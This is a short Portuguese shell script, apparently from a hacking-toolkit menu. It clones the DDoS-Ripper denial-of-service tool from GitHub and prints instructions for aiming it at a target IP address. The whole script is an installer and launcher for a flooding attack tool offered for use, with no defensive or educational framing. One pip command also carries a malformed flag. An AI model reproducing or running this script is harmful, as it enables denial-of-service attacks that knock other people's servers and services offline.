echo "*LIMPANDO TERMINAL" | figlet | lolcat
clear
echo "*INSTALANDO DEPEDENCIAS" | figlet | lolcat
pip install -upgrade pip
echo "*CLONANDO REPOSITORIO...." | figlet | lolcat
clear
echo "BAIXANDO: DDoS-Ripper" | lolcat
echo "(isso pode demorar um pouco)" | lolcat
cd $HOME/foxys_blt/downloads
git clone https://github.com/palahsu/DDoS-Ripper.git
echo "FINALIZADO, EXECUTANDO SCRIPT :)" | figlet | lolcat
cd DDoS-Ripper
echo "Como usar a ferramenta?: $python3 DRipper.py -s [Endereço de ip] -t 135"
echo "exemplo: python3 DRipper.py -s 0.00.00.00 -t 135 " | lolcat && echo "Obrigado por usar nossa plataforma, volte sempre" | lolcat
